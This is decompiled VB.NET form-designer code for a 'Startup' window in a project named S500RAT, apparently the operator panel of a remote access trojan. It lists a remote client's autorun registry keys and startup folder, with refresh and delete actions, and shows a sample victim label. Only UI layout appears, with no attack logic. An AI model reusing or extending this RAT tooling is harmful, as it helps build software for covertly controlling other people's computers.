Namespace S500RAT
	' Token: 0x02000034 RID: 52
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormStartup
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000ED7 RID: 3799 RVA: 0x00083204 File Offset: 0x00081404
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000ED8 RID: 3800 RVA: 0x00083254 File Offset: 0x00081454
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim listViewGroup As Global.System.Windows.Forms.ListViewGroup = New Global.System.Windows.Forms.ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", Global.System.Windows.Forms.HorizontalAlignment.Left)
			Dim listViewGroup2 As Global.System.Windows.Forms.ListViewGroup = New Global.System.Windows.Forms.ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", Global.System.Windows.Forms.HorizontalAlignment.Left)
			Dim listViewGroup3 As Global.System.Windows.Forms.ListViewGroup = New Global.System.Windows.Forms.ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", Global.System.Windows.Forms.HorizontalAlignment.Left)
			Dim listViewGroup4 As Global.System.Windows.Forms.ListViewGroup = New Global.System.Windows.Forms.ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", Global.System.Windows.Forms.HorizontalAlignment.Left)
			Dim listViewGroup5 As Global.System.Windows.Forms.ListViewGroup = New Global.System.Windows.Forms.ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", Global.System.Windows.Forms.HorizontalAlignment.Left)
			Dim listViewGroup6 As Global.System.Windows.Forms.ListViewGroup = New Global.System.Windows.Forms.ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", Global.System.Windows.Forms.HorizontalAlignment.Left)
			Dim listViewGroup7 As Global.System.Windows.Forms.ListViewGroup = New Global.System.Windows.Forms.ListViewGroup("Startup Folder", Global.System.Windows.Forms.HorizontalAlignment.Left)
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormStartup))
			Me.L1 = New Global.Gry.Helper.AeroListView()
			Me.Cnames = New Global.System.Windows.Forms.ColumnHeader()
			Me.CDiscription = New Global.System.Windows.Forms.ColumnHeader()
			Me.ControllContextMenuStrip = New Global.System.Windows.Forms.ContextMenuStrip(Me.components)
			Me.RefreshList = New Global.System.Windows.Forms.ToolStripMenuItem()
			Me.PathDelete = New Global.System.Windows.Forms.ToolStripMenuItem()
			Me.IM = New Global.System.Windows.Forms.ImageList(Me.components)
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.Guna2Elipse1 = New Global.Guna.UI2.WinForms.Guna2Elipse(Me.components)
			Me.UiLabel1 = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.Guna2ResizeBox1 = New Global.Guna.UI2.WinForms.Guna2ResizeBox()
			Me.StartupNum = New Global.System.Windows.Forms.Label()
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.MAX = New Global.S500RAT.ValleyMax()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.ControllContextMenuStrip.SuspendLayout()
			MyBase.SuspendLayout()
			Me.L1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.L1.BackColor = Global.System.Drawing.SystemColors.Control
			Me.L1.BorderStyle = Global.System.Windows.Forms.BorderStyle.None
			Me.L1.Columns.AddRange(New Global.System.Windows.Forms.ColumnHeader() { Me.Cnames, Me.CDiscription })
			Me.L1.ContextMenuStrip = Me.ControllContextMenuStrip
			Me.L1.ForeColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.L1.FullRowSelect = True
			listViewGroup.Header = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
			listViewGroup.Name = "Group1"
			listViewGroup2.Header = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
			listViewGroup2.Name = "Group2"
			listViewGroup3.Header = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
			listViewGroup3.Name = "Group3"
			listViewGroup4.Header = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
			listViewGroup4.Name = "Group4"
			listViewGroup5.Header = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
			listViewGroup5.Name = "Group5"
			listViewGroup6.Header = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
			listViewGroup6.Name = "Group6"
			listViewGroup7.Header = "Startup Folder"
			listViewGroup7.Name = "Group7"
			Me.L1.Groups.AddRange(New Global.System.Windows.Forms.ListViewGroup() { listViewGroup, listViewGroup2, listViewGroup3, listViewGroup4, listViewGroup5, listViewGroup6, listViewGroup7 })
			Me.L1.HeaderStyle = Global.System.Windows.Forms.ColumnHeaderStyle.Nonclickable
			Me.L1.HideSelection = False
			Me.L1.LargeImageList = Me.IM
			Me.L1.Location = New Global.System.Drawing.Point(21, 81)
			Me.L1.Name = "L1"
			Me.L1.Size = New Global.System.Drawing.Size(602, 314)
			Me.L1.SmallImageList = Me.IM
			Me.L1.StateImageList = Me.IM
			Me.L1.TabIndex = 1
			Me.L1.UseCompatibleStateImageBehavior = False
			Me.L1.View = Global.System.Windows.Forms.View.Details
			Me.Cnames.Text = "Name"
			Me.Cnames.Width = 148
			Me.CDiscription.Text = "Type"
			Me.CDiscription.Width = 611
			Me.ControllContextMenuStrip.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.ControllContextMenuStrip.ImageScalingSize = New Global.System.Drawing.Size(20, 20)
			Me.ControllContextMenuStrip.Items.AddRange(New Global.System.Windows.Forms.ToolStripItem() { Me.RefreshList, Me.PathDelete })
			Me.ControllContextMenuStrip.Name = "ContextMenuStrip1"
			Me.ControllContextMenuStrip.Size = New Global.System.Drawing.Size(123, 56)
			Me.RefreshList.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.RefreshList.ForeColor = Global.System.Drawing.Color.FromArgb(204, 204, 204)
			Me.RefreshList.Image = CType(componentResourceManager.GetObject("RefreshList.Image"), Global.System.Drawing.Image)
			Me.RefreshList.Name = "RefreshList"
			Me.RefreshList.Size = New Global.System.Drawing.Size(122, 26)
			Me.RefreshList.Text = "Refresh"
			Me.PathDelete.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.PathDelete.ForeColor = Global.System.Drawing.Color.FromArgb(204, 204, 204)
			Me.PathDelete.Image = CType(componentResourceManager.GetObject("PathDelete.Image"), Global.System.Drawing.Image)
			Me.PathDelete.Name = "PathDelete"
			Me.PathDelete.Size = New Global.System.Drawing.Size(122, 26)
			Me.PathDelete.Text = "Delete"
			Me.IM.ImageStream = CType(componentResourceManager.GetObject("IM.ImageStream"), Global.System.Windows.Forms.ImageListStreamer)
			Me.IM.TransparentColor = Global.System.Drawing.Color.Transparent
			Me.IM.Images.SetKeyName(0, "176.png")
			Me.IM.Images.SetKeyName(1, "177.png")
			Me.IM.Images.SetKeyName(2, "178.png")
			Me.Timer1.Interval = 2000
			Me.Guna2Elipse1.BorderRadius = 20
			Me.Guna2Elipse1.TargetControl = Me.L1
			Me.UiLabel1.AutoSize = True
			Me.UiLabel1.BackColor = Global.System.Drawing.Color.Transparent
			Me.UiLabel1.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.UiLabel1.ForeColor = Global.System.Drawing.Color.White
			Me.UiLabel1.Location = New Global.System.Drawing.Point(19, 11)
			Me.UiLabel1.Name = "UiLabel1"
			Me.UiLabel1.Size = New Global.System.Drawing.Size(58, 19)
			Me.UiLabel1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.UiLabel1.TabIndex = 339
			Me.UiLabel1.Text = "Startup"
			Me.UiLabel1.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Microsoft YaHei", 8.25F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(20, 35)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(200, 16)
			Me.ClientInfo.TabIndex = 340
			Me.ClientInfo.Text = "FC / Desktop_3424 / Windows 10 pro"
			Me.Guna2ResizeBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Guna2ResizeBox1.BackColor = Global.System.Drawing.Color.Transparent
			Me.Guna2ResizeBox1.FillColor = Global.System.Drawing.Color.Silver
			Me.Guna2ResizeBox1.ForeColor = Global.System.Drawing.Color.Empty
			Me.Guna2ResizeBox1.Location = New Global.System.Drawing.Point(618, 400)
			Me.Guna2ResizeBox1.Name = "Guna2ResizeBox1"
			Me.Guna2ResizeBox1.Size = New Global.System.Drawing.Size(17, 19)
			Me.Guna2ResizeBox1.TabIndex = 515
			Me.Guna2ResizeBox1.TargetControl = Me
			Me.Guna2ResizeBox1.UseTransparentBackground = True
			Me.StartupNum.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left)
			Me.StartupNum.AutoSize = True
			Me.StartupNum.BackColor = Global.System.Drawing.Color.Transparent
			Me.StartupNum.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.StartupNum.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.StartupNum.Location = New Global.System.Drawing.Point(28, 406)
			Me.StartupNum.Name = "StartupNum"
			Me.StartupNum.Size = New Global.System.Drawing.Size(70, 14)
			Me.StartupNum.TabIndex = 516
			Me.StartupNum.Text = "Startup [ 0 ]"
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(561, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 575
			Me.Mini.Text = "ValleyMini1"
			Me.MAX.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.MAX.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MAX.Location = New Global.System.Drawing.Point(587, 12)
			Me.MAX.Name = "MAX"
			Me.MAX.Size = New Global.System.Drawing.Size(20, 20)
			Me.MAX.TabIndex = 574
			Me.MAX.Text = "ValleyMax1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(613, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 573
			Me.ExitForm.Text = "ValleyClose1"
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 40
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(645, 430)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.MAX)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.StartupNum)
			MyBase.Controls.Add(Me.Guna2ResizeBox1)
			MyBase.Controls.Add(Me.UiLabel1)
			MyBase.Controls.Add(Me.ClientInfo)
			MyBase.Controls.Add(Me.L1)
			Me.DoubleBuffered = True
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormStartup"
			Me.Text = "FormStartup"
			MyBase.TopMost = True
			Me.ControllContextMenuStrip.ResumeLayout(False)
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x040006A7 RID: 1703
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
